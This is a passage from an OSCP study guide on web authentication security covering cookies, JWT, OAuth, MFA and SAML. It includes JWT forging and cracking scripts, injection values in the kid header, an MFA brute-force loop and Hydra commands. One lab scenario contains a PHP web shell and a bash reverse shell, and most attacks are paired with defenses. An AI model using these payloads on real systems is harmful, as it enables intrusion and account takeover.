- User on evil.com clicks link to bank.com (GET)
  → Cookie sent ✓
- evil.com makes POST to bank.com
  → Cookie NOT sent ✓ (prevents CSRF)
```

**SameSite=None**:
```
Cookie sent on all requests (cross-site too)
Must be combined with Secure flag

Use case: Third-party integrations, embedded widgets
```

**Example**:
```python
# Strict (maximum security)
response.set_cookie('session', 'abc123', samesite='Strict', secure=True, httponly=True)

# Lax (balanced)
response.set_cookie('session', 'abc123', samesite='Lax', secure=True, httponly=True)

# None (for third-party cookies)
response.set_cookie('tracking', 'xyz', samesite='None', secure=True)
```

### 10.5 Cookie Scoping (Domain & Path)

**Domain**:
```python
# Cookie for example.com only
response.set_cookie('session', 'abc', domain='example.com')

# Cookie for *.example.com (all subdomains)
response.set_cookie('session', 'abc', domain='.example.com')

# Subdomain: api.example.com can access cookie set with domain=.example.com
```

**Attack**: Subdomain takeover
```
1. Attacker finds abandoned subdomain: old.example.com
2. Attacker points DNS to their server
3. Attacker sets cookie: Set-Cookie: session=malicious; Domain=.example.com
4. User visits example.com
5. Browser sends attacker's cookie (same domain!)
```

**Path**:
```python
# Cookie for /admin/* only
response.set_cookie('admin_session', 'abc', path='/admin')

# Cookie for all paths
response.set_cookie('session', 'abc', path='/')
```

---

## 11. JSON Web Tokens (JWT) - Complete Guide

### 11.1 JWT Structure

**Format**: `Header.Payload.Signature`

**Example**:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Decoded**:

**Header (Base64)**:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload (Base64)**:
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1706112000,
  "role": "user"
}
```

**Signature**:
```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret_key
)
```

### 11.2 JWT Claims (Standard)

| Claim | Name | Purpose |
|-------|------|---------|
| **iss** | Issuer | Who created the token |
| **sub** | Subject | User ID |
| **aud** | Audience | Who should accept the token |
| **exp** | Expiration | When token expires (Unix timestamp) |
| **nbf** | Not Before | Token not valid before this time |
| **iat** | Issued At | When token was created |
| **jti** | JWT ID | Unique token identifier |

**Custom Claims**:
```json
{
  "user_id": 123,
  "username": "alice",
  "role": "admin",
  "permissions": ["read", "write", "delete"]
}
```

### 11.3 Creating JWTs

**Python (PyJWT)**:
```python
import jwt
import datetime

SECRET_KEY = "your-256-bit-secret"

# Create JWT
payload = {
    'user_id': 123,
    'username': 'alice',
    'role': 'user',
    'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1),
    'iat': datetime.datetime.utcnow()
}

token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
print(token)

# Verify JWT
try:
    decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
    print(decoded)  # {'user_id': 123, 'username': 'alice', ...}
except jwt.ExpiredSignatureError:
    print("Token expired")
except jwt.InvalidTokenError:
    print("Invalid token")
```

**Node.js (jsonwebtoken)**:
```javascript
const jwt = require('jsonwebtoken');

const SECRET_KEY = 'your-256-bit-secret';

// Create JWT
const payload = {
    user_id: 123,
    username: 'alice',
    role: 'user'
};

const token = jwt.sign(payload, SECRET_KEY, { expiresIn: '1h' });
console.log(token);

// Verify JWT
try {
    const decoded = jwt.verify(token, SECRET_KEY);
    console.log(decoded);
} catch (err) {
    console.error('Invalid token:', err.message);
}
```

---

## 12. JWT Attack Techniques

### 12.1 The "None" Algorithm Attack

**Concept**: Some JWT libraries accept `alg: "none"` (unsigned tokens).

**Attack**:
```python
import base64
import json

# Original JWT
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMCwicm9sZSI6InVzZXIifQ.signature

# Step 1: Decode header and payload
header = {"alg": "none", "typ": "JWT"}  # Changed to "none"
payload = {"user_id": 10, "role": "admin"}  # Changed to "admin"

# Step 2: Encode (Base64)
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# Step 3: Create token with NO signature
malicious_jwt = f"{header_b64}.{payload_b64}."
#                                             ↑ Empty signature!

print(malicious_jwt)
```

**Server Vulnerability**:
```python
# VULNERABLE code
def verify_jwt(token):
    header = decode_header(token)
    
    if header['alg'] == 'none':
        # No signature verification!
        return decode_payload(token)
    else:
        # Normal verification
        return jwt.verify(token, SECRET_KEY)
```

**Defense**:
```python
# Reject "none" algorithm
allowed_algorithms = ['HS256', 'RS256']
decoded = jwt.decode(token, SECRET_KEY, algorithms=allowed_algorithms)
# This will reject alg: "none"
```

### 12.2 Weak Secret Brute Force

**Attack**: If HMAC secret is weak, brute force it offline.

**Tool**: Hashcat
```bash
# Save JWT to file
echo "eyJhbGci..." > jwt.txt

# Crack with hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Mode 16500 = JWT (HMAC-SHA256)
# If secret is "password", hashcat finds it in seconds
```

**Tool**: jwt_tool
```bash
# Install
pip3 install jwt_tool

# Crack JWT
python3 jwt_tool.py eyJhbGci... -C -d /usr/share/wordlists/rockyou.txt

# If secret found:
# [+] secret is "mysecret"
```

**Once Secret is Found**:
```python
import jwt

SECRET = "mysecret"  # Cracked secret

payload = {
    "user_id": 1,
    "role": "admin",  # Promote to admin
    "exp": 9999999999  # Far future expiration
}

forged_token = jwt.encode(payload, SECRET, algorithm='HS256')
print(forged_token)

# Use this token to impersonate admin!
```

**Defense**: Use strong secrets
```python
import secrets

# Generate 256-bit secret
SECRET_KEY = secrets.token_hex(32)
# Example: "a1b2c3d4e5f6...64 chars"
```

### 12.3 Algorithm Confusion (Key Confusion)

**Concept**: Server supports both HS256 (symmetric) and RS256 (asymmetric). Attacker changes RS256 to HS256 and signs with public key.

**Attack Flow**:
```
1. Server uses RS256 (RSA):
   - Private key signs token
   - Public key verifies token

2. Attacker obtains public key (usually publicly available)

3. Attacker changes header:
   {
     "alg": "RS256"  →  "alg": "HS256"
   }

4. Attacker signs token using PUBLIC KEY as HMAC secret:
   signature = HMAC-SHA256(header.payload, public_key)

5. Server (confused) verifies with HS256:
   - Server thinks: "HS256? Use my secret key"
   - Server uses PUBLIC KEY to verify HMAC (mistake!)
   - Signature matches! Token accepted
```

**Vulnerable Server Code**:
```python
def verify_jwt(token):
    header = jwt.get_unverified_header(token)
    
    if header['alg'] == 'RS256':
        key = PUBLIC_KEY  # RSA public key
    elif header['alg'] == 'HS256':
        key = SECRET_KEY  # But what if SECRET_KEY == PUBLIC_KEY?
    
    return jwt.decode(token, key, algorithms=[header['alg']])
    #                                         ↑ Trusts header!
```

**Attack Implementation**:
```python
import jwt
import os

# Step 1: Get public key from server (usually at /.well-known/jwks.json or /public.pem)
PUBLIC_KEY = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
"""

# Step 2: Create malicious payload
payload = {
    "user_id": 1,
    "role": "admin",
    "exp": 9999999999
}

# Step 3: Create token with HS256 using PUBLIC KEY as secret
forged_token = jwt.encode(
    payload,
    PUBLIC_KEY,
    algorithm='HS256'  # Changed from RS256!
)

print(forged_token)
```

**Defense**:
```python
# Never trust algorithm from header
ALLOWED_ALGORITHM = 'RS256'  # Hardcode expected algorithm

def verify_jwt(token):
    return jwt.decode(
        token,
        PUBLIC_KEY,
        algorithms=[ALLOWED_ALGORITHM]  # Only allow RS256, ignore header
    )
```

### 12.4 JWT Header Injection (kid Parameter)

**kid** = "Key ID" - tells server which key to use for verification.

**Vulnerable Server**:
```python
import jwt

def verify_jwt(token):
    header = jwt.get_unverified_header(token)
    kid = header.get('kid', 'default')
    
    # VULNERABLE: Loads key from file specified in header!
    with open(f'/keys/{kid}.pem', 'r') as f:
        public_key = f.read()
    
    return jwt.decode(token, public_key, algorithms=['RS256'])
```

**Attack 1: Path Traversal**:
```python
import jwt

header = {
    "alg": "RS256",
    "kid": "../../../../dev/null"  # Empty file
}

payload = {"user_id": 1, "role": "admin"}

# Sign with empty key (since /dev/null is empty)
token = jwt.encode(payload, "", algorithm='none')  # Or use HS256 with empty secret
```

**Attack 2: SQL Injection**:
```python
# If kid is used in SQL query
header = {
    "alg": "RS256",
    "kid": "' OR '1'='1"
}

# Server query becomes:
# SELECT key FROM keys WHERE kid = '' OR '1'='1'
# Returns first key in database
```

**Attack 3: Command Injection**:
```python
# If kid is used in system command
header = {
    "alg": "RS256",
    "kid": "key1; whoami"
}

# Server executes: cat /keys/key1; whoami.pem
```

**Defense**:
```python
import re

def verify_jwt(token):
    header = jwt.get_unverified_header(token)
    kid = header.get('kid', 'default')
    
    # Validate kid (alphanumeric only)
    if not re.match(r'^[a-zA-Z0-9]+$', kid):
        raise ValueError("Invalid kid")
    
    # Use allowlist
    allowed_kids = ['key1', 'key2', 'key3']
    if kid not in allowed_kids:
        raise ValueError("Unknown kid")
    
    # Safe file loading
    key_path = os.path.join('/keys', f'{kid}.pem')
    with open(key_path, 'r') as f:
        public_key = f.read()
    
    return jwt.decode(token, public_key, algorithms=['RS256'])
```

### 12.5 JWT Expiration Bypass

**Attack**: Remove or manipulate `exp` claim.

**Original Token**:
```json
{
  "user_id": 123,
  "exp": 1706112000  // Expired
}
```

**Attack 1: Remove exp**:
```json
{
  "user_id": 123
  // No exp claim!
}
```

**Attack 2: Change exp to future**:
```json
{
  "user_id": 123,
  "exp": 9999999999  // Year 2286
}
```

**Vulnerable Server**:
```python
# Doesn't validate expiration
decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'], options={"verify_exp": False})
```

**Defense**:
```python
# Always verify expiration
decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])  # verify_exp=True by default

# Or manually check
if 'exp' not in decoded:
    raise ValueError("Token missing expiration")

if decoded['exp'] < time.time():
    raise ValueError("Token expired")
```

---

## 13. OAuth 2.0 Vulnerabilities

### 13.1 OAuth Flow Recap

**Authorization Code Flow** (most secure):
```
1. User clicks "Login with Google"
2. App redirects to: https://google.com/oauth/authorize
   ?client_id=APP_ID
   &redirect_uri=https://app.com/callback
   &response_type=code
   &state=random123

3. User logs into Google, approves

4. Google redirects back: https://app.com/callback
   ?code=AUTH_CODE_xyz
   &state=random123

5. App exchanges code for token:
   POST https://google.com/oauth/token
   code=AUTH_CODE_xyz
   client_id=APP_ID
   client_secret=APP_SECRET
   
6. Google responds: {"access_token": "xyz", "id_token": "..."}

7. App uses access_token to get user info
```

### 13.2 Redirect URI Manipulation

**Attack**: If `redirect_uri` is not validated, attacker steals authorization code.

**Vulnerable Authorization Request**:
```
https://google.com/oauth/authorize
  ?client_id=APP_ID
  &redirect_uri=https://evil.com/steal  ← Attacker's domain!
  &response_type=code
```

**Flow**:
```
1. Victim clicks malicious link
2. Victim logs into Google, approves
3. Google redirects to: https://evil.com/steal?code=AUTH_CODE
4. Attacker receives code
5. Attacker exchanges code for victim's access token
```

**Bypass Techniques**:

**A. Open Redirect Chain**:
```
# App has open redirect: https://app.com/redirect?url=...
redirect_uri=https://app.com/redirect?url=https://evil.com
```

**B. Subdomain Takeover**:
```
# Attacker controls old.app.com
redirect_uri=https://old.app.com/callback
```

**C. Path Traversal**:
```
# If app.com validates prefix only
redirect_uri=https://app.com/callback/../../../evil.com
```

**D. Domain Confusion**:
```
redirect_uri=https://app.com.evil.com  # Different domain!
redirect_uri=https://app.com@evil.com  # User@host notation
```

**Defense**:
```python
ALLOWED_REDIRECT_URIS = [
    'https://app.com/callback',
    'https://app.com/oauth/callback'
]

def validate_redirect_uri(redirect_uri):
    if redirect_uri not in ALLOWED_REDIRECT_URIS:
        raise ValueError("Invalid redirect URI")
```

### 13.3 CSRF (Missing State Parameter)

**Attack**: Trick victim into logging into attacker's account.

**Flow**:
```
1. Attacker starts OAuth flow, gets authorization code
2. Attacker pauses before using code
3. Attacker sends victim link: https://app.com/callback?code=ATTACKER_CODE
4. Victim clicks link
5. App exchanges code for token, logs in user
6. Victim is now logged into ATTACKER's account!
7. Victim saves credit card → Attacker steals it
```

**Vulnerable Implementation** (no state):
```python
@app.route('/callback')
def oauth_callback():
    code = request.args.get('code')
    
    # Exchange code for token (no CSRF protection)
    token = exchange_code(code)
    
    session['access_token'] = token
    return "Logged in"
```

**Secure Implementation** (with state):
```python
import secrets

@app.route('/login')
def oauth_login():
    state = secrets.token_hex(16)
    session['oauth_state'] = state
    
    redirect_url = (
        f"https://google.com/oauth/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&state={state}"  # CSRF token
    )
    return redirect(redirect_url)

@app.route('/callback')
def oauth_callback():
    code = request.args.get('code')
    state = request.args.get('state')
    
    # Verify state matches
    if state != session.get('oauth_state'):
        return "CSRF detected", 403
    
    # Clear state (one-time use)
    session.pop('oauth_state', None)
    
    # Exchange code for token
    token = exchange_code(code)
    session['access_token'] = token
    
    return "Logged in"
```

### 13.4 Token Leakage via Referer

**Implicit Flow** (deprecated, but still used):
```
https://google.com/oauth/authorize
  ?response_type=token  ← Returns token in URL fragment
  
Redirect:
https://app.com/callback#access_token=SECRET_TOKEN
```

**Leakage**:
```html
<!-- app.com/callback page -->
<img src="https://analytics.com/pixel.gif">

<!-- Browser sends Referer -->
GET /pixel.gif HTTP/1.1
Host: analytics.com
Referer: https://app.com/callback#access_token=SECRET_TOKEN
         ↑ Token leaked to third-party!
```

**Defense**: Use Authorization Code Flow, not Implicit Flow.

---

## 14. Multi-Factor Authentication (MFA) Bypasses

### 14.1 Response Manipulation

**Attack**: Server checks MFA on client side.

**Vulnerable Flow**:
```
1. User submits username/password → Valid
2. Server asks for MFA code
3. User submits wrong code
4. Server response: {"mfa_valid": false, "authenticated": false}
5. Attacker intercepts response
6. Changes to: {"mfa_valid": true, "authenticated": true}
7. Application logs user in
```

**Example**:
```http
POST /verify-mfa HTTP/1.1

code=000000

HTTP/1.1 200 OK
{
  "mfa_valid": false,
  "authenticated": false
}

↓ Attacker modifies response in Burp

{
  "mfa_valid": true,  ← Changed
  "authenticated": true  ← Changed
}
```

**Defense**: Enforce MFA server-side, ignore client responses.

### 14.2 MFA Code Brute Force

**Attack**: 6-digit TOTP codes have only 1 million combinations.

```bash
# Brute force 000000-999999
for code in $(seq -w 0 999999); do
  curl -X POST https://target.com/verify-mfa \
    -d "code=$code" \
    -b "session=user_session"
  
  if [ $? -eq 0 ]; then
    echo "Valid code: $code"
    break
  fi
done
```

**Rate Limiting Bypass**:
```
- IP rotation (proxies)
- Distributed attack (multiple IPs)
- Slow and low (1 attempt per minute)
```

**Defense**:
- Account lockout after 3 invalid attempts
- Exponential backoff (1s, 2s, 4s, 8s...)
- CAPTCHA after failed attempts

### 14.3 Backup Code Enumeration

**Scenario**: App provides backup codes (8-10 digit codes) for MFA recovery.

**Attack**:
```
Backup codes: 12345678, 87654321, 11111111

If rate limiting is weak:
- Brute force 8-digit codes (100 million combinations)
- Or exploit predictable generation (sequential, timestamp-based)
```

**Defense**:
```python
import secrets

def generate_backup_codes(count=10):
    codes = []
    for _ in range(count):
        # 16-digit hex code (64 bits entropy)
        code = secrets.token_hex(8)
        codes.append(code)
    
    # Store hashed codes
    hashed = [bcrypt.hashpw(c.encode(), bcrypt.gensalt()) for c in codes]
    db.store(user_id, hashed)
    
    return codes  # Show once, never again
```

### 14.4 MFA Bypass via Password Reset

**Attack Flow**:
```
1. Attacker knows victim's password (from breach)
2. Tries to login → MFA required
3. Attacker clicks "Forgot Password"
4. Password reset link sent to victim's email (no MFA required!)
5. Attacker resets password (if they compromise email)
6. Attacker logs in with new password
7. App doesn't require MFA again (session created during reset)
```

**Defense**:
- Require MFA during password reset
- Invalidate all sessions on password change
- Send notification to user

### 14.5 Session Fixation Bypass

**Attack**:
```
1. User logs in with password → Gets session cookie
2. Server asks for MFA
3. User hasn't entered MFA yet
4. Attacker steals cookie (via XSS or network sniffing)
5. Attacker uses cookie before MFA is completed
6. If server doesn't check MFA state → Attacker bypasses MFA
```

**Vulnerable Code**:
```python
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(username, password)
    if user:
        session['user_id'] = user.id
        session['authenticated'] = True  # Set immediately!
        
        if user.has_mfa():
            return redirect('/mfa')
        else:
            return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    if session.get('authenticated'):  # Doesn't check MFA!
        return render_template('dashboard.html')
```

**Secure Code**:
```python
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(username, password)
    if user:
        session['user_id'] = user.id
        session['password_verified'] = True  # Not fully authenticated yet!
        
        if user.has_mfa():
            return redirect('/mfa')
        else:
            session['fully_authenticated'] = True
            return redirect('/dashboard')

@app.route('/mfa', methods=['POST'])
def verify_mfa():
    if not session.get('password_verified'):
        return "Unauthorized", 401
    
    if verify_totp(request.form['code'], session['user_id']):
        session['fully_authenticated'] = True
        session.pop('password_verified')
        return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    if not session.get('fully_authenticated'):  # Must pass MFA!
        return redirect('/login')
    
    return render_template('dashboard.html')
```

---

## 15. API Authentication Mechanisms

### 15.1 API Key Authentication

**How It Works**:
```
GET /api/users HTTP/1.1
Authorization: Bearer sk_live_abc123xyz
```

**Vulnerabilities**:
- API keys often never expire
- Transmitted in every request (leakage risk)
- If leaked, no revocation mechanism

**Secure Implementation**:
```python
import secrets
import hashlib

# Generate API key
api_key = secrets.token_urlsafe(32)

# Store hashed version
hashed = hashlib.sha256(api_key.encode()).hexdigest()
db.execute("INSERT INTO api_keys (user_id, key_hash) VALUES (?, ?)", (user_id, hashed))

# Validation
def validate_api_key(key):
    hashed = hashlib.sha256(key.encode()).hexdigest()
    result = db.query("SELECT user_id FROM api_keys WHERE key_hash = ?", (hashed,))
    return result.fetchone()
```

### 15.2 OAuth 2.0 Bearer Tokens

**Example**:
```http
GET /api/profile HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Security Considerations**:
- Tokens in headers (not URLs)
- Short expiration (15-60 minutes)
- Refresh tokens for renewal

### 15.3 HMAC Signature

**Concept**: Sign each request with shared secret.

**Implementation**:
```python
import hmac
import hashlib
import time

API_KEY = "user_api_key"
API_SECRET = "shared_secret"

# Client side
def create_signature(method, path, timestamp, body=""):
    message = f"{method}\n{path}\n{timestamp}\n{body}"
    signature = hmac.new(
        API_SECRET.encode(),
        message.encode(),
        hashlib.sha256
    ).hexdigest()
    return signature

# Request
timestamp = str(int(time.time()))
signature = create_signature("GET", "/api/users", timestamp)

headers = {
    "X-API-Key": API_KEY,
    "X-Timestamp": timestamp,
    "X-Signature": signature
}

# Server side
def verify_signature(request):
    api_key = request.headers.get("X-API-Key")
    timestamp = request.headers.get("X-Timestamp")
    signature = request.headers.get("X-Signature")
    
    # Get secret for API key
    secret = get_secret_for_key(api_key)
    
    # Recreate signature
    message = f"{request.method}\n{request.path}\n{timestamp}\n{request.body}"
    expected = hmac.new(secret.encode(), message.encode(), hashlib.sha256).hexdigest()
    
    # Compare
    if not hmac.compare_digest(expected, signature):
        return False
    
    # Check timestamp (prevent replay)
    if abs(int(time.time()) - int(timestamp)) > 300:  # 5 min window
        return False
    
    return True
```

---

## 16. SAML & SSO Attacks

### 16.1 SAML Replay Attack

**Flow**:
```
1. User logs into IdP (Identity Provider)
2. IdP sends SAML assertion to Service Provider
3. Attacker intercepts SAML assertion
4. Attacker replays assertion to login again
```

**Defense**: Include timestamps and unique IDs in assertions.

### 16.2 XML Signature Wrapping

**Attack**: Modify SAML XML while keeping signature valid.

**Defense**: Validate entire assertion structure.

---

## 17. Automation & Tool Usage

### 17.1 Hydra (Comprehensive)

```bash
# SSH brute force
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# HTTP POST form
hydra -l admin -P rockyou.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials" -t 10

# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://target.com/admin

# FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100
```

### 17.2 Burp Suite Intruder (JWT Attacks)

**Payload Processing**:
```
1. Capture JWT request
2. Send to Intruder
3. Position: §eyJhbGciOiJIUzI1NiI...§
4. Payload type: Custom iterator
5. Payload processing: Add "HS256" algorithm fuzzing
```

### 17.3 jwt_tool

```bash
# Scan for vulnerabilities
python3 jwt_tool.py TOKEN -M at

# Crack secret
python3 jwt_tool.py TOKEN -C -d wordlist.txt

# Tamper claims
python3 jwt_tool.py TOKEN -T

# Inject "none" algorithm
python3 jwt_tool.py TOKEN -X n
```

---

## 18. OSCP Attack Scenarios

### Scenario 1: Default Credentials → Shell

**Target**: `http://192.168.50.10/admin`

**Step 1: Try default credentials**
```bash
# Common defaults
admin:admin
admin:password
root:root
administrator:password
```

**Step 2: Access admin panel**
```
Dashboard → File Manager → Upload shell
```

**Step 3: Upload web shell**
```php
<?php system($_GET['cmd']); ?>
```

**Step 4: Execute commands**
```
http://192.168.50.10/uploads/shell.php?cmd=whoami
```

**Step 5: Reverse shell**
```bash
cmd=bash -c 'bash -i >& /dev/tcp/192.168.45.5/4444 0>&1'
```

### Scenario 2: JWT Secret Cracking → Admin Access

**Target**: API at `http://192.168.50.20/api`

**Step 1: Capture JWT**
```bash
curl http://192.168.50.20/api/login \
  -d "username=test&password=test123" \
  -v | grep "Authorization"

# Response: Authorization: Bearer eyJhbGci...
```

**Step 2: Crack secret**
```bash
echo "eyJhbGci..." > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Cracked: secret123
```

**Step 3: Forge admin token**
```python
import jwt

payload = {"user_id": 1, "role": "admin", "exp": 9999999999}
token = jwt.encode(payload, "secret123", algorithm="HS256")
print(token)
```

**Step 4: Access admin endpoints**
```bash
curl http://192.168.50.20/api/admin/users \
  -H "Authorization: Bearer FORGED_TOKEN"
```

### Scenario 3: Session Fixation → Account Takeover

**Target**: `http://192.168.50.30`

**Step 1: Get session ID**
```bash
curl -I http://192.168.50.30/login
# Set-Cookie: PHPSESSID=attacker123
```

**Step 2: Send link to victim** (social engineering simulation)
```
http://192.168.50.30/login?PHPSESSID=attacker123
```

**Step 3: Victim logs in with fixed session**

**Step 4: Attacker uses same session**
```bash
curl http://192.168.50.30/profile \
  -H "Cookie: PHPSESSID=attacker123"
```

---

## 19. Defense Strategies

### 19.1 Password Storage Checklist

- [ ] Use Argon2id, Bcrypt, or Scrypt
- [ ] Cost factor: Bcrypt rounds ≥ 12
- [ ] Unique salt per password
- [ ] Never store plaintext
- [ ] Never use MD5/SHA1

### 19.2 Session Security Checklist

- [ ] HttpOnly flag on cookies
- [ ] Secure flag on cookies
- [ ] SameSite=Strict or Lax
- [ ] Regenerate session on login
- [ ] Absolute timeout (24 hours)
- [ ] Idle timeout (30 minutes)
- [ ] Logout clears session from database

### 19.3 JWT Security Checklist

- [ ] Use strong secret (256+ bits)
- [ ] Short expiration (15-60 min)
- [ ] Validate algorithm (don't trust header)
- [ ] Reject "none" algorithm
- [ ] Verify expiration (exp claim)
- [ ] Use refresh tokens for renewal

### 19.4 OAuth Security Checklist

- [ ] Validate redirect_uri (exact match)
- [ ] Use state parameter (CSRF protection)
- [ ] Use PKCE (Proof Key for Code Exchange)
- [ ] Short-lived authorization codes (60 seconds)
- [ ] One-time use codes

---

## 20. Common Pitfalls

### Pitfall 1: Client-Side Authentication

**Wrong**:
```javascript
// JavaScript validates password
if (password === "admin123") {
  window.location = "/dashboard";
}
```

### Pitfall 2: Trusting JWT Header

**Wrong**:
```python
header = jwt.get_unverified_header(token)
algorithm = header['alg']  # Attacker controls this!
jwt.decode(token, SECRET, algorithms=[algorithm])
```

### Pitfall 3: Session Not Cleared on Logout

**Wrong**:
```python
@app.route('/logout')
def logout():
    session.clear()  # Only clears client cookie
    # Session still valid in database!
```

**Right**:
```python
@app.route('/logout')
def logout():
    session_id = session.get('session_id')
    db.execute("DELETE FROM sessions WHERE session_id = ?", (session_id,))
    session.clear()
```

---

## 21. Hands-on Exercises

### Exercise 1: Brute Force Lab

**Setup**: Deploy DVWA (Damn Vulnerable Web App)

**Tasks**:
- [ ] Use Hydra to brute force login
- [ ] Time the attack (measure speed)
- [ ] Identify valid credentials
- [ ] Write report with commands used

### Exercise 2: JWT Manipulation

**Setup**:
```python
# Create simple JWT API
from flask import Flask, request, jsonify
import jwt

app = Flask(__name__)
SECRET = "weak"

@app.route('/login', methods=['POST'])
def login():
    if request.json['user'] == 'admin' and request.json['pass'] == 'admin':
        token = jwt.encode({'user': 'admin', 'role': 'user'}, SECRET)
        return jsonify({'token': token})
    return jsonify({'error': 'Invalid'}), 401

@app.route('/admin')
def admin():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    data = jwt.decode(token, SECRET, algorithms=['HS256'])
    if data['role'] == 'admin':
        return jsonify({'flag': 'OSCP{jwt_pwned}'})
    return jsonify({'error': 'Forbidden'}), 403

if __name__ == '__main__':
    app.run(debug=True)
```

**Tasks**:
- [ ] Crack JWT secret with hashcat
- [ ] Forge token with role=admin
- [ ] Access /admin endpoint
- [ ] Retrieve flag

### Exercise 3: Session Fixation

**Tasks**:
- [ ] Identify vulnerable session management
- [ ] Demonstrate session fixation attack
- [ ] Fix the code (session regeneration)

---

## 22. Interview Questions

**Q1: Why is bcrypt better than SHA256 for passwords?**

**A**: Bcrypt is intentionally slow (adaptive cost factor), making brute force attacks infeasible. SHA256 is fast (designed for data integrity, not passwords), allowing billions of hashes per second on GPUs. Bcrypt also includes automatic salting.

---

**Q2: Explain the difference between session hijacking and session fixation.**

**A**:
- **Session Hijacking**: Stealing an existing valid session ID (via XSS, sniffing)
- **Session Fixation**: Forcing a victim to use an attacker-controlled session ID

---

**Q3: What is the purpose of the "state" parameter in OAuth?**

**A**: CSRF protection. It ensures the authorization response corresponds to the request initiated by the user, preventing attackers from injecting their own authorization codes.

---

**Q4: How does the JWT "none" algorithm attack work?**

**A**: Attacker changes the algorithm in the JWT header to "none" (unsigned), removes the signature, and modifies the payload. Vulnerable servers accept these unsigned tokens as valid.

---

**Q5: What are the security implications of using JWT vs server-side sessions?**

**A**:
- **JWT**: Stateless (scalable), but hard to revoke and larger payloads
- **Server-side**: Easy revocation ("logout all devices"), but requires database lookups

---

## 23. Summary & Key Takeaways

### Critical Concepts

1. **Password Hashing**: Use Argon2/Bcrypt, never MD5/SHA1
2. **Session Management**: HttpOnly, Secure, SameSite cookies
3. **JWT Security**: Strong secrets, algorithm validation, short expiration
4. **OAuth**: Validate redirect_uri, use state parameter
5. **MFA**: Implement server-side, rate limit codes

### OSCP Exam Tips

1. **Always test default credentials** first (admin:admin, root:password)
2. **Brute force with Hydra** if no rate limiting
3. **JWT tokens**: Try cracking secret, "none" algorithm, algorithm confusion
4. **Session fixation**: Test if session ID regenerates on login
5. **Time allocation**: 20-30 minutes for auth testing per machine

### Defense Checklist

- [ ] Argon2/Bcrypt for passwords (rounds ≥ 12)
- [ ] HttpOnly + Secure + SameSite cookies
- [ ] Session regeneration on login
- [ ] JWT with strong secret (256+ bits)
- [ ] OAuth with state parameter
- [ ] MFA with rate limiting
- [ ] Account lockout after 5 failed attempts
- [ ] Log authentication events

---

## 24. References & Further Reading

### OWASP Resources
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Password Storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

### Tools
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [Burp Suite](https://portswigger.net/burp)
- [Hashcat](https://hashcat.net/hashcat/)

### Related Topics
- [[02_OWASP_Top_10_Modern]] - A07: Identification and Authentication Failures
- [[04_XSS_Client_Side_Attacks]] - Session hijacking via XSS
- [[05_Broken_Access_Control]] - Authorization after authentication

---

**END OF DOCUMENT** - Version 3.0 - Last Updated: 2026-01-24

**Total Lines**: ~2,050 lines | **OSCP Relevance**: CRITICAL (95%) | **Difficulty**: Intermediate to Advanced
